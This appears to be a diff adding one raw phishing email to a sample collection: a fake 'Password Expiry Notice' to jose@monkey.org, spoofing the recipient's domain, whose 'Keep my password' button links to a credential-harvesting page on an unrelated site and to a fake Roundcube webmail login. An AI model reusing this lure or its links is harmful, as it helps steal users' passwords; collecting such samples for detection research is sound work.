@@ -1,0 +1,198 @@
+Return-Path: rhea@manhuasao.com
+Delivered-To: jose@monkey.org
+X-FDA: 83800660104.19.4197E91
+Received: from dully.manhuasao.com (dully.manhuasao.com [86.106.104.242])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 906D01C0005
+	for <jose@monkey.org>; Thu, 21 Aug 2025 12:15:30 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=B+lHoQ0E;
+	spf=pass (imf05.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1755778530;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=tk9F+Yk2pMmgHwaX4s6nH/kn5wYljcv992maCNoqdxA=;
+	b=3fm4C/EV+WD94qCjRfiFLMbIRVexoYZiSeuUAAXHHGucbfEsxJFjstxg8Mt3v/L/v4B/Q+
+	MfXPE1d9WaDiFYWIkYDl8/Lp0ibkVNFwqg67hG/VxwZAt1hA7JOl4goqPQJwlSxkiGDyF/
+	OaY/w2NKjX5/32Ztp+taVFYxAGYY6JY=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1755778530; a=rsa-sha256;
+	cv=none;
+	b=VRm5Uhr16fI+9SIUQDpBFP+MqhKjGQ86gm9nrrHaxcbC+wQpRER8UHS5BYvR0s/XQl1lU1
+	KqZYuKe8BCHKjgjlOKUlJPKNQGzq2pT9SPb4nnuJK/GGElXL4qegnBc94YW873ieJ/NHVN
+	x9A1sJ8GV1qP5AUJ69J2Y4akaeo04Ow=
+ARC-Authentication-Results: i=1;
+	imf05.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=B+lHoQ0E;
+	spf=pass (imf05.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=manhuasao.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=rhea@manhuasao.com;
+ bh=I1bmEL7OiFCsl9RYjv91w2Jj7Ss=;
+ b=B+lHoQ0EpgLOmToAKuesdDbFwFZaE8v2+aRmPDXaRr4rJELk41YyplII0wUN7Chqgk+IqR9gtQkW
+   6Fe9h+qy9iaNJwUCvJ0bbDZZ1L/2U98DKxkrzYoRbm4x99Ffdk881pI8mxMR2SV1dwJmYoK2E9Co
+   M5tCHNed9vijDbD76mV2fyZAwyFMJKrcOK4/bvFSEbvvV7Cve341EZlXobMizXfCDzNL4aogarEV
+   huv9R2lw3L5F2G35YybtPIY6locliGL0I4f1SqsMs0SkcFoEaWc0H6qS3w1gbMH50ke5ojyr4ZQO
+   vZiQv3TSiirEuU91IBE075UhTvHPU6s+GVbEzw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=manhuasao.com;
+ b=aLBf2E2cPO525DJ2SlEXjxNfUZTpKLokvLB3Vnt+3clokkmj4FAnKOPW8DfNeQhiIWG2jtPtVgVP
+   w8Y65IK4qDP7z4rWbkXZLh6g+aWXQnr/JgoR/AVNOOohWZgLHwlWMZE/EXmAe3Jz4lkw1IY0GmyI
+   KDhlNRgW7FRKwNgxRBJWyiO35TdppxJy+rl2SszXK48Oy0x6Jj0zPzIWUCuv0GLvGN+Yhqn5bQBy
+   VobvC8Bygcfs4xh81OurSrEewj9j0i/2nj3ai5p40JCeIw3mfaR9Adyc3noWhXqj29vUZY7zfJBp
+   Gqqa9kG8aOoEqhFB6gePPAzUXrqNH90Pg1p+yg==;
+From: monkey.org <rhea@manhuasao.com>
+To: jose@monkey.org
+Subject: Password Expiry Notice for jose@monkey.org
+Date: 20 Aug 2025 13:26:41 +0200
+Message-ID: <20250820132641.66DFB544C1A66C3A@manhuasao.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: Yes, score=9.39
+X-Stat-Signature: updzrim1isw117n5tcy1a16iq5h6ukof
+X-Rspam-User: 
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 906D01C0005
+X-HE-Tag: 1755778530-814558
+X-HE-Meta: 
+ U2FsdGVkX19/W+xCqujUppcT2pKyzFJWfvTnm8Nun0gDUpvvtEeWGhB5kHJhBN2p0sKKLVZK06l4TlolREh8+iFtm1NCyarjyYV+ES69E8qSQnYuDta5XyQNDYn1x3wuHSgs7gtIxPEuLqCdes0M8gvV6TaJHth7zKHfdQdHBFWHJY6SxRzbl3mzUTN+QnHt07OJQu4k+TNWhgCop62dUMlk+dx2bI0QYbSZzaS1G7qaThkXNxAsru+ZQ5o/2Wa8/33d+hLr64cpSOiw3hcaQ7vy4yu4+jq8iz9An8NlYEzu30YUFRk84Y9D0AMDnuaG2gnwE0sTFWFjsid7vP4gEVdD6oVRhDO9CkVJsgEMthUW+zE6hXA1oLLGyOt140ztOYYqMBCI9FVWZ6ouGrNPqBqBKo0k/a8MIeAmDLgGEj3VJu1mYwqWYXbK+S3fqY9vwpy8I5hSWEhZOgPovVtKLhH45bCHjjaZNT4vzkJ/6lSodgeOC6IsPLQy6s/ht4wp/UEmkWWbAQLnbUwUOs8BBa0+zz5ejDqbkUzNVJn5R2JEvl7yx982cZwhdNXxyq+OEyHy5FDQPw5JCtx218AS3TXOA5wou9128uxjn1ovTzpKO4sS/mmBYEmqWyMK/F88FMg8UvWrahsqlv/OQpxSsu1VnmD2JugkJ3lhEyE7ap0zdjVssgTowMm7ovXTfhSR+eooqgD49jntWqdDYrfX96yYhy16DyRDthBewDbbb5YpEQ87j+WD/Gr0fADifN0GGmvMYbmix4FHGJGgJ/ZP9WwlhmlG7+OXVIJDp7c9Q+8nzGQus6UpGGWWTp4mDlftqe0PBsBP7L54jQA4mQZ2x7Qbfy/RFY/jJv14Ddmd3TUm6p4ILKTwJJXYluxZfVjVAlFejjkXbD7A/cIHLyFmmuWGcGiafPNPu1KkTHyBl6cYPF3BuvpYoUps42vnhuVxKyvYIZLHAEnBHhVpVze8aUPpOAa
+ RjO5tx0K9+0kEiWyeilIwNNJ/NzMHNpg+9ri9vWVfIqPE1JLWomKt03GNbDZKCeU/6m4eY1VGSLCSc2z4CqNnqP9mw5nNtS/26w122D9xHnan6nConYRpw+bEHXW7eDyuXYgg5D+mqYpvH9PvvS3uclLCVKwx61D5sX4pOMsHF1CjqBYlkF+MiqizjpcpxSvdtJlKnXDMNYClZxFJpcgMOV4930G0EZ5S3t4X6HvtN2WRclqyP56oHJBJjA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 335
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"640" lang=3D"en" style=3D'color: rgb(0, 0, 0); text-transfo=
+rm: none; letter-spacing: normal; font-family: "Times New Roman"; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; border-rig=
+ht-color: rgb(227, 227, 227); border-left-color: rgb(227, 227, 227); border=
+-right-width: 1px; border-left-width: 1px; border-right-style: solid; borde=
+r-left-style: solid; white-space: normal; border-collapse: collapse; border=
+-spacing: 0px; orphans: 2; widows: 2; background-color:=20
+rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norm=
+al; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
+t-decoration-style: initial; text-decoration-color: initial;' dir=3D"ltr" b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr style=3D"backgro=
+und-color: rgb(18, 124, 214);">
+<td width=3D"310" valign=3D"middle" style=3D"margin: 0px; padding: 12px 0px=
+; border-top-color: rgb(227, 227, 227); border-bottom-color: rgb(227, 227, =
+227); border-top-width: 1px; border-bottom-width: 1px; border-top-style: so=
+lid; border-bottom-style: solid; border-collapse: collapse;"><h1 style=3D'm=
+argin: 0px auto auto; padding: 0px; color: rgb(255, 255, 255); line-height:=
+ 20pt; font-family: "Segoe UI Light"; font-size: 18pt; font-weight: 400;'>
+<span id=3D"m_-6467113285859285718m_2687946547135545110gmail-v1v1v1m_770601=
+4129160121292m_5886565084284705165gmail-v1v1HeaderPlaceholder_UserVerificat=
+ionEmailHeader"><br class=3D"Apple-interchange-newline"><span>Password Expi=
+ration</span></span></h1></td>
+<td width=3D"24" style=3D"margin: 0px; padding: 0px; border-top-color: rgb(=
+227, 227, 227); border-bottom-color: rgb(227, 227, 227); border-top-width: =
+1px; border-bottom-width: 1px; border-top-style: solid; border-bottom-style=
+: solid; border-collapse: collapse;">
+&nbsp;</td></tr></tbody></table>
+<table width=3D"640" lang=3D"en" style=3D'color: rgb(0, 0, 0); text-transfo=
+rm: none; letter-spacing: normal; font-family: "Times New Roman"; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; border-collapse: collapse; border-spacing: 0px; orphans: 2; wido=
+ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
+; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
+n-thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;' dir=3D"ltr" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0"><tbody><tr><td width=3D"1" style=3D"background: 0% 50% r=
+gb(227, 227, 227); margin: 0px; padding: 0px; border-collapse: collapse;">&=
+nbsp;</td><td width=3D"24" style=3D"margin: 0px; padding: 0px; border-colla=
+pse: collapse;">&nbsp;</td>
+<td width=3D"640" id=3D"m_-6467113285859285718m_2687946547135545110gmail-v1=
+v1v1m_7706014129160121292m_5886565084284705165gmail-v1v1PageBody" valign=3D=
+"top" style=3D"margin: 0px; padding: 10px 0px 20px; border-bottom-color: rg=
+b(227, 227, 227); border-bottom-width: 1px; border-bottom-style: solid; bor=
+der-collapse: collapse;" colspan=3D"2"><table style=3D"border-collapse: col=
+lapse; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
+0"><tbody><tr>
+<td width=3D"630" style=3D"margin: 0px; padding: 0px; line-height: 13pt; fo=
+nt-size: 10pt; border-collapse: collapse;"><table width=3D"100%" lang=3D"en=
+" style=3D"border-collapse: collapse; border-spacing: 0px;" dir=3D"ltr" bor=
+der=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margi=
+n: 0px; padding: 0px; border-collapse: collapse;">
+<div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51, 51); font-famil=
+y: "Segoe UI", Tahoma, sans-serif; font-size: 14px; border-top-color: curre=
+ntColor; border-top-width: 0px; border-top-style: none;'><span id=3D"m_-646=
+7113285859285718m_2687946547135545110gmail-v1v1v1m_7706014129160121292m_588=
+6565084284705165gmail-v1v1BodyPlaceholder_UserVerificationEmailBodySentence=
+1"><font face=3D"Arial">
+Your password is set to expire on&nbsp;<span style=3D"color: rgb(51, 51, 51=
+); text-transform: none; text-indent: 0px; letter-spacing: normal; font-fam=
+ily: Arial; font-size: 14px; font-style: normal; font-weight: 400; word-spa=
+cing: 0px; float: none; display: inline !important; white-space: normal; or=
+phans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-lig=
+atures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;">8/21/2025<=
+span>&nbsp;</span></span><br><br><span style=3D"color: rgb(0, 0, 0); font-s=
+ize: 13px;">
+&#65279;&#65279;&#65279;&#65279;&#10687;jose@monkey.org</span></font></span=
+><br>&nbsp;</div><div style=3D'margin: 0px; padding: 0px; color: rgb(51, 51=
+, 51); font-family: "Segoe UI", Tahoma, sans-serif; font-size: 14px;'><br s=
+tyle=3D'color: rgb(29, 34, 40); font-family: "Segoe UI Light", serif, Emoji=
+Font; font-size: 13px;'><span id=3D"m_-6467113285859285718m_268794654713554=
+5110gmail-v1v1v1m_7706014129160121292m_5886565084284705165gmail-v1v1BodyPla=
+ceholder_UserVerificationEmailBodySentence2">
+<font face=3D"Arial" size=3D"2">
+<a style=3D'background: 0% 50% rgb(18, 124, 214); padding: 7px; color: rgb(=
+255, 255, 255); font-family: "segoe ui light"; font-size: 15px; text-decora=
+tion-line: none;' href=3D"https://cheshiremaintenance.com/wp-includes/ssl/a=
+add.php#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://globalgrains=
+adf.com/CHB_RDCUBE783hjdhjd773hgrf794h/Roundcube/Roundcube%2520Webmail%2520=
+__%2520Welcome%2520to%2520Roundcube%2520Webmail.html%23murtuza@sarsanwala.c=
+om&amp;source=3Dgmail&amp;ust=3D1755159373317000&amp;usg=3DAOvVaw2rHbmz2h1c=
+efjRUDhf6-AU">Keep my password</a></font></span></div>&nbsp;<div style=3D'm=
+argin: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: "Segoe UI", =
+Tahoma, sans-serif; font-size: 14px;'>&nbsp;</div></td></tr>
+</tbody></table></td></tr></tbody></table></td><td width=3D"1" style=3D"mar=
+gin: 0px; padding: 0px; border-collapse: collapse;">&nbsp;</td><td width=3D=
+"1" style=3D"margin: 0px; padding: 0px; border-collapse: collapse;">&nbsp;<=
+/td><td width=3D"1" style=3D"margin: 0px; padding: 0px; border-collapse: co=
+llapse;">&nbsp;</td><td width=3D"1" valign=3D"top" style=3D"margin: 0px; pa=
+dding: 0px; border-collapse: collapse;">&nbsp;</td><td width=3D"29" style=
+=3D"margin: 0px; padding: 0px; border-collapse: collapse;">&nbsp;</td>
+<td width=3D"1" style=3D"background: 0% 50% rgb(227, 227, 227); margin: 0px=
+; padding: 0px; border-collapse: collapse;">&nbsp;</td></tr><tr><td width=
+=3D"1" style=3D"background: 0% 50% rgb(227, 227, 227); margin: 0px; padding=
+: 0px; border-bottom-color: rgb(227, 227, 227); border-bottom-width: 1px; b=
+order-bottom-style: solid; border-collapse: collapse;">&nbsp;</td>
+<td width=3D"24" style=3D"margin: 0px; padding: 0px; border-bottom-color: r=
+gb(227, 227, 227); border-bottom-width: 1px; border-bottom-style: solid; bo=
+rder-collapse: collapse;">&nbsp;</td>
+<td width=3D"585" id=3D"m_-6467113285859285718m_2687946547135545110gmail-v1=
+v1v1m_7706014129160121292m_5886565084284705165gmail-v1v1PageFooterContainer=
+" valign=3D"top" style=3D"margin: 0px; padding: 20px 0px; border-bottom-col=
+or: rgb(227, 227, 227); border-bottom-width: 1px; border-bottom-style: soli=
+d; border-collapse: collapse;" colspan=3D"6">
+<table width=3D"585" id=3D"m_-6467113285859285718m_2687946547135545110gmail=
+-v1v1v1m_7706014129160121292m_5886565084284705165gmail-v1v1PageFooter" styl=
+e=3D"border-collapse: collapse; border-spacing: 0px;" border=3D"0" cellspac=
+ing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin: 0px; padding: 0=
+px; border-collapse: collapse;"><table lang=3D"en" style=3D"width: 425px; h=
+eight: 81px; margin-right: 30px; border-collapse: collapse; border-spacing:=
+ 0px;" dir=3D"ltr" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody>=
+
+<tr><td style=3D"margin: 0px; padding: 0px; border-collapse: collapse;"><p =
+style=3D'margin: 0px 0px 0px 5px; padding: 10px 0px; color: rgb(102, 102, 1=
+02); font-family: "Segoe UI", Tahoma, sans-serif; font-size: 10px;'><span i=
+d=3D"m_-6467113285859285718m_2687946547135545110gmail-v1v1v1m_7706014129160=
+121292m_5886565084284705165gmail-v1v1ContactInfo">jose@monkey.org&nbsp;Corp=
+oration| Message ID : 92775645bc1aba6751e1359bb4f54d<wbr>75</span><br>
+This message was sent from an unmonitored email address. Please do not repl=
+y to this message.<br>.</p></td></tr></tbody></table></td></tr></tbody></ta=
+ble></td></tr></tbody></table></body></html>
+
